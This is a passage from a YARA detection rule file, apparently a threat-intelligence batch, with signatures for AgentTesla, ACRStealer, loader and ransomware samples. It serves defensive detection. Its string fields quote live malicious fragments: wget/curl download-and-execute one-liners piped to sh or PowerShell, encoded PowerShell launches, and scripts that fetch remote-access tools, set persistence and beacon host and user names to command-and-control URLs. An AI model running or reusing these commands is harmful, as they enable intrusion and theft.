      description = "_subset_batch - file AgentTesla(signature)_1a1d386c.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1a1d386c0c661cc471bf52b315c9827a9e3959d9bff424dd306be9f58ef6b136"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "* HE#rp" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__28edffbf {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_28edffbf.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "28edffbfd5fab960a88aa8950137e7aafc23eeb5fa28cff8585054901c499b6d"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__4c7bcfa2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4c7bcfa2.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4c7bcfa265a8332ca7dd445fcd0434e050c9c70419ae3fb365f82818b90c212a"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "p%qmffiHk\"> -" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__a1a4c8ab {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_a1a4c8ab.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a1a4c8ab49ddaca690f6102289a6c0803216cbd36029b4b12d4646accaaf4087"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__ba077d21 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_ba077d21.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ba077d2123afef8f4bfa8a6173f29d62614bbb72f40ac8bdf34520457dd4fcdc"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "|%LYlz%Q:v" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3a137b71 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3a137b71.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3a137b71007144ad53b5b37513af0a9b2341cb118b928524e1297266e6413b0a"
   strings:
      $s1 = "Solosllmam.exe" fullword wide /* score: '22.00'*/
      $s2 = "http://energytulcea.ro/Nycfuel.vdf" fullword wide /* score: '10.00'*/
      $s3 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule a6d9974f6975337e23431aa7f42564617e0b502ce4a176f9daf312657794a1fe_a6d9974f {
   meta:
      description = "_subset_batch - file a6d9974f6975337e23431aa7f42564617e0b502ce4a176f9daf312657794a1fe_a6d9974f.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a6d9974f6975337e23431aa7f42564617e0b502ce4a176f9daf312657794a1fe"
   strings:
      $s1 = "_445169.hta" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 20KB and
      all of them
}

rule a7ae1fb44ca7d806b5579812a484f3442fedf3f165eaa3bb8eab405e02f0488a_a7ae1fb4 {
   meta:
      description = "_subset_batch - file a7ae1fb44ca7d806b5579812a484f3442fedf3f165eaa3bb8eab405e02f0488a_a7ae1fb4.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a7ae1fb44ca7d806b5579812a484f3442fedf3f165eaa3bb8eab405e02f0488a"
   strings:
      $x1 = "sh.Run \"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABmACAAPQAgACQAZQBuAHYAOgBCAEEAVABDAEgAX" ascii /* score: '45.00'*/
      $x2 = "sh.Run \"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABmACAAPQAgACQAZQBuAHYAOgBCAEEAVABDAEgAX" ascii /* score: '45.00'*/
      $s3 = "Set sh = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 4KB and
      1 of ($x*) and all of them
}

rule a813ff25f7229f2e963bf8bc1fa25cd35a62fc7a5536e1b445aff8bdb44e15cb_a813ff25 {
   meta:
      description = "_subset_batch - file a813ff25f7229f2e963bf8bc1fa25cd35a62fc7a5536e1b445aff8bdb44e15cb_a813ff25.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a813ff25f7229f2e963bf8bc1fa25cd35a62fc7a5536e1b445aff8bdb44e15cb"
   strings:
      $s1 = "Sparrow Wallet-Installer.exe" fullword ascii /* score: '19.00'*/
      $s2 = "qPvc.OCE" fullword ascii /* score: '10.00'*/
      $s3 = "_\\;6,(b'" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s4 = " /BvASaIP" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__5 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9fca54ff3de83ec3b037243689ebd2a9b5f6ea10834b55c9f5baf643b2d528da"
   strings:
      $s1 = "P.O.# 01942454.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule ac75746a6cf31efbd113e9d1852e5b7c58cf0865bd04270d228bf25b8a4b9f4f_ac75746a {
   meta:
      description = "_subset_batch - file ac75746a6cf31efbd113e9d1852e5b7c58cf0865bd04270d228bf25b8a4b9f4f_ac75746a.py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ac75746a6cf31efbd113e9d1852e5b7c58cf0865bd04270d228bf25b8a4b9f4f"
   strings:
      $s1 = "skeYhfBafRDUD6ZzktUpOiZebaDJCxnc8H7Sx7ZpgZqCvvzp3EZJNIBXn6YWMZ2y4s+EtYUykex88zd6F2y4iv77wOmYXlms5HqG7hcYuUZiLwxxHMq96Fj+G/IzxLiL" ascii /* score: '14.00'*/
      $s2 = "        # Execute the decrypted code" fullword ascii /* score: '13.00'*/
      $s3 = "nr+Mmdw7VBn4npr3RvWFwn6P/L34HqVY6FaSgr9suIuyJ/SdhB65VPhSrsYXGLmmpuP8tflHUGhMcqKfAs29sqKb0QjJCxhQXFbOYxIh6R764/joyX8ZfNQKpscnIPCy" ascii /* score: '11.00'*/
      $s4 = "+i8ELMl/GXzUCqbHJyDwsnb/0PXc3lVEiMZeXr9suIuyY9DtnD4NgOAKitcHbMyKnr+Mmdw7VBn4ioqfQlmtWpLj0KXZoxhRwUJC1zI9Ibb6Z+CZ1DoN7Mhqit9HbMyK" ascii /* score: '11.00'*/
      $s5 = "s6rFoMkLGXzUJ9fSY22x7uK/iZnQQiVk4Fb/8zp53MJOi9DA7aMYUcFDn9IXba3qvr+E8MieeVzUAs73KlS5jv+r0chhCxhRwUOf0hdsuIuy64yF8Fs5ScivqiYW9b2u" ascii /* score: '11.00'*/
      $s6 = "4r/w4PkKNUSlB7t6F2y4ivLj4JmZKgBYLW5r04Z5tcLW65S12QpVcNRyrt8qfayKgr/8vZgrcFCscorqNiGZnoKbyJ3YHz0lwEr6gwIgsK8bAsWgyQo9ScB6ooIWSYGi" ascii /* score: '11.00'*/
      $s7 = "s6rFoYgOURzUC6bXBn1Fjvq3kJXcMkhxyXaz2idssL+Gh9DE/BI9YNVLr9Neef3eluPQsLzaUQTVc57zAl34/7oH0MTIEj1g1ULC90ZMudrulsSB3GsZfNQm0+IWdYXC" ascii /* score: '11.00'*/
      $s8 = "Aj71oZQuIQCkAoqeLv1lNno7MQjJCxhQHEa6g45R8UaWk9iR3LYReNROz+teefXa1uvRoL0KRXT4EvqTAiCBGm4XDDBhoxhRwUIS4yohrSq2k9SR3TIdGNwS+pMCILj/" ascii /* score: '11.00'*/
      $s9 = "i6uUpYAWDQHAAtbvGnn1x4Or0OmANlBQzH6Oxn9t1Z7647Go7aMYUcFDn9IXbTW6jufQAcwyCWDVYt6bKmGtxv5X4JnQNyFwAAqi3wIh9K8bqsWgyQsYUcDOru9aeRmO" ascii /* score: '11.00'*/
      $s10 = "p6qxoZQuIQCkAoqeLuUFNgMCbaDJCxmUlFbKx8IhrcI2a0mZzEIFAKQCip4XGLlnG6rFoMkLGFHAHrrrRgn5nv+TdGEQtr3B8ULC9y493cqm5vwBTLKJ4FVzngem0QEW" ascii /* score: '11.00'*/
      $s11 = "jqdQwMl/GXzUCqbHJyDwsmqPjPGcDinU8HKi34IMEIuzqsR9gC5JRAAKot8CIfU+pp/46a0LbFDsVtbrAlz0w4p3jIWYHtkY/E6Kn1rZrb6O46EIyQsYUAQWiocCufWe" ascii /* score: '11.00'*/
      $s12 = "+pfItYRHKFB4fqbGJ231qqab9K30Gg2sjGb2xifEuIuzqsWgyQqtxHS+Em+i2R1bstrEFVy+5ZhUjgobzviIinIvWDU0nvnETJZOR+qlLQ4idwwFGJ+wUcFDn/a/bLiL" ascii /* score: '11.00'*/
      $s13 = "NntQXQTe1ZBU+g5Hh2zMi/LKheCJS1gRgRM3ehdsuIry4+CZmSoAWC1ua9OaJa2O4o/8vMhGTRyAVqbDAny5yvqXyLWER3BQrALW7xp59cZOk8CV3H8QdWlDn9IWIe2G" ascii /* score: '11.00'*/
      $s14 = "lpPQ7OkvsFHBQ5/SF2y52vrOrQjJCxhRwUOf0hdsuIqev6HlNCoNMcE3nuMyVa3GX+sxmYRaUXSBY7vrWi2JruOKzcjBLvQUNXrSg15J+KuXAsWgyQsYUcFDn9IXbZWe" ascii /* score: '11.00'*/
      $s15 = "vr+I7KGjGFHBQ5/SF22twvuqsaFUHkngxA7OR14lhcOTjm2gyQsYUcFDnpNeSYHbkrLMTPz/GcjEZq7HB23pt7KnjLXMWgxQgAqi3wIh9Ire64ydxB5VHDx6mucCGIiK" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 30KB and
      8 of them
}

rule ac7b607fbeb126a19b4f7dbd8686d6436b20b2ab654471e23429cc23dd47410b_ac7b607f {
   meta:
      description = "_subset_batch - file ac7b607fbeb126a19b4f7dbd8686d6436b20b2ab654471e23429cc23dd47410b_ac7b607f.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ac7b607fbeb126a19b4f7dbd8686d6436b20b2ab654471e23429cc23dd47410b"
   strings:
      $x1 = "$eJJBMs='HKLM:\\SOFTWARE\\Classes\\'; $LulR=(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain; $ygDi='HKCU:\\Software\\';" ascii /* score: '67.00'*/
      $s2 = "x.exe'; Start-Process -FilePath $mxmvyE -WorkingDirectory (Split-Path $mxmvyE); if ($cBRtzPZ) { $YTgcsxcw=New-Object -ComObject " ascii /* score: '29.00'*/
      $s3 = "finition($pWvIEN,$ANchzi,6,$env:USERNAME,$null,3); } else { New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\Current" ascii /* score: '24.00'*/
      $s4 = "hIXFi.Hidden=$true; $ANchzi.Principal.RunLevel=1; $ITKcwz.Author=$env:USERNAME; $mmGgN.Id='LogonTriggerId'; $ITKcwz.Description=" ascii /* score: '21.00'*/
      $s5 = "$eJJBMs='HKLM:\\SOFTWARE\\Classes\\'; $LulR=(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain; $ygDi='HKCU:\\Software\\';" ascii /* score: '21.00'*/
      $s6 = " $hIXFi.ExecutionTimeLimit='PT0S'; $IHIJlH.Path=$mxmvyE; $hIXFi.StopIfGoingOnBatteries=$false; $hIXFi.DisallowStartIfOnBatteries" ascii /* score: '20.00'*/
      $s7 = "        $tMFxKGq=Join-Path $mUCk $_;         $jUSGNAL='bitsadmin.exe /transfer netcfgx /download /priority normal \"0\" \"1\"' -" ascii /* score: '20.00'*/
      $s8 = "i', 'msvcr100.dll', 'remcmdstub.exe', 'HTCTL32.DLL', 'NSM.LIC', 'client32.ini', 'PCICHEK.DLL', 'netcfgx.exe', 'PCICL32.DLL'); $g" ascii /* score: '19.00'*/
      $s9 = ";}; if ($cSRtQkjQ -eq 1) { [NeT.SErvicepOiNtMaNager]::SeCUrITYPROtOcOL=[NeT.SecUrItyProToCoLTYpe]::TLs12; cD $EnV:apPDATa; $Ojei" ascii /* score: '18.00'*/
      $s10 = "ive.exe'; $ZFgFEI+'keepkey-desktop\\KeepKey Desktop.exe'; $eDlqSaW+'BitBox\\BitBox.exe'; ); $YDwQkvp=$LcNUK.length; if ($LulR) {" ascii /* score: '17.00'*/
      $s11 = "$cBRtzPZ=$false; }; try { $uTyARl=New-Object System.Net.WebClient; [byte[]]$HvvItX=$uTyARl.DownloadData($gSCoAnD); $uTyARl.Dispo" ascii /* score: '16.00'*/
      $s12 = "FEI=$env:localappdata+'\\Programs\\'; $eDlqSaW='C:\\Program Files\\'; $cSRtQkjQ=0; $FHquYsUO='HKCU:\\Software\\Classes\\'; $LcNU" ascii /* score: '16.00'*/
      $s13 = " $KwcytGf=\"https://congenialespresso.top/sts/sts.php?cpnme=$Env:COmPuTERNaMe&usnme=$ENv:uSeRnAmE&param=\"; IF ($BZwj.id) { $BIa" ascii /* score: '16.00'*/
      $s14 = "='https://congenialespresso.top/files/'; $WmvWd=@('AudioCapture.dll', 'TCCTL32.DLL', 'nskbfltr.inf', 'pcicapi.dll', 'nsm_vpro.in" ascii /* score: '15.00'*/
      $s15 = "$OGmaVAr=-1; $mUCk=Join-Path $env:APPDATA $pWvIEN; if (-not (Test-Path $mUCk)) { New-Item -Force -ItemType Directory -Path $mUCk" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6524 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ec14a3cc9e51cab35b526215ff6cd6d5925304fe81fde4ad87ce0759f6419390"
   strings:
      $s1 = "VjddbCVmk" fullword ascii /* base64 encoded string 'V7]l%f' */ /* score: '14.00'*/
      $s2 = "lAWS.RQv" fullword ascii /* score: '10.00'*/
      $s3 = "*  GF5" fullword ascii /* score: '9.00'*/
      $s4 = "* 6nYG" fullword ascii /* score: '9.00'*/
      $s5 = "QftP}<VU/" fullword ascii /* score: '9.00'*/
      $s6 = "jIsGeTy" fullword ascii /* score: '9.00'*/
      $s7 = "\"=#*5/0}" fullword ascii /* score: '9.00'*/ /* hex encoded string 'P' */
   condition:
      uint16(0) == 0x7a37 and filesize < 10000KB and
      all of them
}

rule ACRStealer_signature__ea1d7b04 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_ea1d7b04.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ea1d7b0425e9df597694e4618830c729d33838f225a7ecd51d5f2d76833354b2"
   strings:
      $x1 = "/x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x2 = "/x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s3 = "/x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s4 = "/x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "/x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "/x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s7 = "/x86/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "/MSVCR110.dll" fullword ascii /* score: '20.00'*/
      $s9 = "/x86/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s10 = "/x86/api-ms-win-crt-convert-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "/x86/api-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "/x86/api-ms-win-crt-multibyte-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "/x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "/x86/api-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "/x86/api-ms-win-crt-environment-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__4ee8cadf {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_4ee8cadf.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4ee8cadfffa15eab0925e4f09b64444377d54c2fa6cbd5a52544f45fe5c26693"
   strings:
      $s1 = " /Wpwx}b9" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 5000KB and
      all of them
}

rule ACRStealer_signature__705dfadd {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_705dfadd.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "705dfadd6cff2fde7205285992271b4e3051814c5e48035652597d7bcfd2c325"
   strings:
      $s1 = "8* -#X" fullword ascii /* score: '9.00'*/
      $s2 = "agEt\":" fullword ascii /* score: '9.00'*/
      $s3 = "#* P1y" fullword ascii /* score: '9.00'*/
      $s4 = "@0Sujkzm* ," fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 10000KB and
      all of them
}

rule ACRStealer_signature__70b0d665 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_70b0d665.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "70b0d665343f34d56f8801e169f3128b6c1bd33350902540d9aa20ad3e32981c"
   strings:
      $s1 = "=JmJkWElO" fullword ascii /* base64 encoded string '&bdXIN' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 12000KB and
      all of them
}

rule ACRStealer_signature__82b10246 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_82b10246.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "82b102469115af364c0bf9b0007ec804c2c3dfed4694c34bbb843268f4829d1d"
   strings:
      $s1 = "* &2<b-}" fullword ascii /* score: '9.00'*/
      $s2 = "p- -<-" fullword ascii /* score: '9.00'*/
      $s3 = "egxfnkg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 10000KB and
      all of them
}

rule ACRStealer_signature__c741b4be {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_c741b4be.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c741b4be010546d2d5108c11398bfe01faaf788e2583ae0e370eb15082d04812"
   strings:
      $s1 = "jJlcS.Mua" fullword ascii /* score: '10.00'*/
      $s2 = "AGNGeTa" fullword ascii /* score: '9.00'*/
      $s3 = "* 6k3U[" fullword ascii /* score: '9.00'*/
      $s4 = "^*\\2C{:#" fullword ascii /* score: '9.00'*/ /* hex encoded string ',' */
      $s5 = "bYKrEf3#* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 24000KB and
      all of them
}

rule ACRStealer_signature__c8f038e2 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_c8f038e2.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c8f038e2b346851ad8f5d24437260e47fdecb5a7c3cf9b74d1f2ca8564f30f10"
   strings:
      $s1 = "47$\"-|\\" fullword ascii /* score: '9.00'*/ /* hex encoded string 'G' */
      $s2 = " -y 2W?" fullword ascii /* score: '9.00'*/
      $s3 = "XFXT\" -#" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 13000KB and
      all of them
}

rule ACRStealer_signature__cf88aac8 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_cf88aac8.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "cf88aac87375ecc6b7f18b61525e5b7d07bb92580552d62a6ae8a8dae94438d4"
   strings:
      $s1 = "aeyE'vs" fullword ascii /* score: '9.00'*/
      $s2 = "* n+?d" fullword ascii /* score: '9.00'*/
      $s3 = "L7. /c " fullword ascii /* score: '9.00'*/
      $s4 = "'* 'acBP?" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 24000KB and
      all of them
}

rule ACRStealer_signature__ee9d5e64 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_ee9d5e64.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ee9d5e64cb4af8b3d0108a02ec3566e511f73b57822c8df6d2fb3d7fa8895abb"
   strings:
      $s1 = "KvGz.gAP" fullword ascii /* score: '10.00'*/
      $s2 = "swTHBv- " fullword ascii /* score: '8.00'*/
      $s3 = "aqkfmxe" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 11000KB and
      all of them
}

rule ad5f9bf557797f0a9e78da2d64bee32c728cf6e7793e9cd9ee1a233942230d57_ad5f9bf5 {
   meta:
      description = "_subset_batch - file ad5f9bf557797f0a9e78da2d64bee32c728cf6e7793e9cd9ee1a233942230d57_ad5f9bf5.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ad5f9bf557797f0a9e78da2d64bee32c728cf6e7793e9cd9ee1a233942230d57"
   strings:
      $s1 = "EncryptRansomware" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6e45 and filesize < 4KB and
      all of them
}

rule ae216d796814df820aad72df65d1f3b8b23991788f415663a11df07e9f2ddc7c_ae216d79 {
   meta:
      description = "_subset_batch - file ae216d796814df820aad72df65d1f3b8b23991788f415663a11df07e9f2ddc7c_ae216d79.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ae216d796814df820aad72df65d1f3b8b23991788f415663a11df07e9f2ddc7c"
   strings:
      $x1 = "AA  AAAA cd /tmp; wget http://23.132.28.196/meow.sh;chmod 777 meow.sh;sh meow.sh;rm -rf meow.sh; history -c " fullword ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x4141 and filesize < 1KB and
      1 of ($x*)
}

rule afe149a2bd1fd850876c4e55621f10d18c3f4bd8244fc8ee744bbb86b08aa1ac_afe149a2 {
   meta:
      description = "_subset_batch - file afe149a2bd1fd850876c4e55621f10d18c3f4bd8244fc8ee744bbb86b08aa1ac_afe149a2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "afe149a2bd1fd850876c4e55621f10d18c3f4bd8244fc8ee744bbb86b08aa1ac"
   strings:
      $s1 = "cmd /c curl rihby.com/aws.amazon.com/l93jb803hn3b7j4bbvkkl3jjd3bqd038fnh/onl/sec/app/ |  powershell" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6d63 and filesize < 1KB and
      all of them
}

rule AgentTesla_signature__6 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5ec0ae8e29f6c0ec2a730643f150c0801e6ffb3fde5bcf015b1ce1cba6814e2c"
   strings:
      $s1 = "3500036071.exe" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__c8994e79 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_c8994e79.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c8994e7911577f27c5bec419466fc98399a75f6f09664d45eab1fca1b8868382"
   strings:
      $s1 = "+New Order 568330.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__7 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6ad081d2d6fb859885b2f2212818acff513a203cbaf5b7617ca4e6dcbba146fe"
   strings:
      $s1 = "** !%$ !$*^#^%#! ~~&^$$*%$& !!^%!!!$!?*# && &**^$&* &*~%#&!^&??&!?**$ ?&&~^*?^$~%~# %~%%??&**#*%! ^&^&#&#?%^*&!?^?*!^$%#&$&C&*?*" ascii /* score: '17.00'*/
      $s2 = "!^$#%~##?#%!^%*#%&&&&*%$$&*?&&*&#%*%^~%~?&$$%$^%$^$&~!~$?* %^%^~% *$#%~$*?&^ ~%i%$&#*%^?$$%* && $ ~% #&!?*^% ?$!~^ !%%&!^*!$#$!%" ascii /* score: '15.00'*/
      $s3 = ">!?~~^& ~*$?& *&^&~^%&^$!& $$ &^~**##~*%~^^^#^^~# %!?!!~^*!%! *&&^&&&%~$!&*#%&!% ~!%*$%#&^# ^*$?? ?^$$?#*&?$&~#&~**? ^$??*^! $#*" ascii /* score: '15.00'*/
      $s4 = "~ &^%&~~* !~*#?!$~!&#!%^#^%$#$^$*$ $^?$ #!# ^*#!^^$!  #?!% #^$~#*&! ?^$%!&$&#%## #^~^?~&~%^%%&? !$%%U%?**&!!!*~*#!~%*^!%%^&  &#%" ascii /* score: '14.00'*/
      $s5 = "** !#~##**&?%~##?~  *#$~%~$*&?& #&# %*?~^!!!!*$!~!*&^!~&!~$^%*?^%? !%?! $$ ^!$?%^*!$ #^%?#^~&?%^!*?~%~%^~$$^%&*^*!?$*&&?^$&&*^*%" ascii /* score: '14.00'*/
      $s6 = "# $$#%&?^V*^*&#  !#? $^#~$*~#$!&^*?%^*??~*% ~ ?#!!!?*$~!# ?~* ~~~?~?!!& ~*&?%^ %&^ !^**#$%!* &$ *%*!$?~%$$^?&^$!~!# ~$$&*?&%%^#!" ascii /* score: '14.00'*/
      $s7 = "# &~!!!~%?$ ?^*~*^%!%% *~#%~%~^!^#!~%H?!*$%?*#$*%!^! &?&$ $&** ?%^?#!?^!*#&~&*??%?*^^??!!~$?*?&$&#&$^~$&$!%^%~^?*$!& ?~#%&$&% $#" ascii /* score: '14.00'*/
      $s8 = "%!&#~? *~##%&#???** *&%!$!!*%*%! #~%*~^!~ !&%m%$ ! ^#^~?**~&^$!!!?!~&$?^~*#$%^ ?&*%??$$* *~% ^~#!%?$ ^~!~*?^  %~!&^~!#?!^&^ *!&#" ascii /* score: '14.00'*/
      $s9 = "$#&* %##^ #*!###~&*$^!*%&~%^?~&~&#!?%?#^#%& $*$* *$?^* #?#~~%!&#^$?&$%$*! Z^~$%%~ %~^$^$~^$~^^?~ ~%  $&*%$^#$$$$!?$%*!#&%^&!^!!!" ascii /* score: '14.00'*/
      $s10 = "* &&^!!!$!!&*&~$^&$% #!$$%## ^^?&~%#~^% ^$?$? !$!%%^!?&J!~# &*&#$&&#&&#&!&&~&#^!^$~?^##?% $!^!?$$#!^?~#~% ~^#%# ^?%?! ! ^?#%^*!$" ascii /* score: '14.00'*/
      $s11 = "* ~*??? &$~$!^!!&$^#^!!!$%??*!$%#?^?##~ ^!?q$~* #&^^~$# !#*~#~%~ ~~!~^#&!%~^? *#~^**?^&^^&*~&^ ?&!?~!* ! #^&&^**^?^$?!~&^#$!#~ %" ascii /* score: '14.00'*/
      $s12 = "#  !~&##$%~#$%* %  !%^?^^%%&#^ ^%*&?^$$~&$~#~? ^%*%!$$&&^#$#!%~  &!!!~* %#%&?#*~R^*%%#%**?$#?!#**!# * ? !^* ?*#? ?^&&$*~%?!$~^^~" ascii /* score: '14.00'*/
      $s13 = "# %$#^&~ ~%%?! #&!~^  %&?*&%Y^^?$%*?%^*?*$?!~$#?#*!#*$!! #%^*!$~~^~^%$ ^! #$%%*##~%## ? $?%!#!$#%%~~?#$%$$? $%%%$ *&??~%#!*$*!!!" ascii /* score: '14.00'*/
      $s14 = "^~%&% %&!*&!~$!!^!^&?~^#~^&?%?!~*!??~*&$$^^^% %~&* #~%$&^!!*%*#%# &~^~%!??!! %*&%~&  ~?%*&~&?k%&$#?~*?%  ~?%*&$*&&?&&**^~~%# !!!" ascii /* score: '14.00'*/
      $s15 = "# !^ &~!?# ~# &?~?#^!%*!%*!!!%~! ~&!%%$! $*  #%?? $?^~^?!&?*%# %#*~$$%# ^$%$*^*~*?%!^$& ?~ $%^%* $$&#* &$#~&Y&#^&$ ^~~##&$ %!?^%" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 15000KB and
      8 of them
}

rule AgentTesla_signature__5bc7a654 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_5bc7a654.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5bc7a6540ac5984e13ac22b807a4724986bb179f9bcf81cab987cfab8e155d3c"
   strings:
